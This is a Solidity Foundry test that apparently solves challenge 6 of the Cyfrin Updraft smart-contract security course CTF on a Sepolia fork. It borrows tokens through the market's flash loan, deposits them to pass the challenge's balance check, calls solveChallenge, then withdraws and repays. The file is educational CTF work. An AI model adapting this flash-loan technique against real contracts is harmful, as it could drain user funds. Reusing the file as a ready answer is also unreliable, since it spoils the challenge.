// SPDX-License-Identifier: MIT

pragma solidity =0.8.24;

import {console} from "forge-std/Test.sol";
import {Base} from "../Base.sol";

interface Challenge {
    function solveChallenge(string memory twitterHandle) external;
    function getMarket() external view returns (address);
    function getToken() external view returns (address);
    function depositMoney(uint256 amount) external;
    function withdrawMoney() external;
}
interface WhoAreYou {
    function owner() external view returns (address);
}
interface S6Market {
    function flashLoan(uint256 amount) external;
}
interface S6Token {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}
interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4);
}
interface IFlashLoanReceiver {
    function execute() external payable;
}


/// @title Solution for challenge 6  for Cyfrin CTF
/// @author focusoor
///
/// @notice This challenge is part of Cytfin Updraft 'Smart Contract Security' course
/// @notice Link to course section: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file#section-6-nft
contract CtfCyfrin6 is Base, WhoAreYou, IFlashLoanReceiver {

    uint256 public constant S6_NFT_COST = 2_000_000e18;

    Challenge challenge = Challenge(CHALLENGE_6);
    address s6Market;
    address s6Token;

    function setUp() public override {
        Base.setUp();
        vm.selectFork(sepoliaFork);
        s6Market = challenge.getMarket();
        s6Token = challenge.getToken();
    }

    function testSolveChallengeCtfCyfrin6() external {
        // calling flashloan will call back execute() with fl amount
        S6Market(s6Market).flashLoan(S6_NFT_COST);
    }

    function owner() external view override returns (address) {
        return address(this);
    }

    /// @notice here we have S6_NFT_COST num of s6Tokens
    function execute() external override payable {

        uint256 thisS6TokenBalance = S6Token(s6Token).balanceOf(address(this));

        // 1. approve challenge to spend s6Tokens
        S6Token(s6Token).approve(address(challenge), thisS6TokenBalance);

        // 2. deposit s6Tokens to challenge
        challenge.depositMoney(thisS6TokenBalance);

        // 3. try to solve the challenge
        vm.expectEmit();
        emit ChallengeSolved(address(this), address(challenge), TWITTER_HANDLE);
        challenge.solveChallenge(TWITTER_HANDLE);

        // 4. withdraw s6Tokens from challenge
        challenge.withdrawMoney();

        // 5. retun flashloan (thisS6TokenBalance should stay the same)
        S6Token(s6Token).transfer(s6Market, thisS6TokenBalance);
    }

    /// @notice because address(this) is msg.sender, we have to add receive method for contract
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
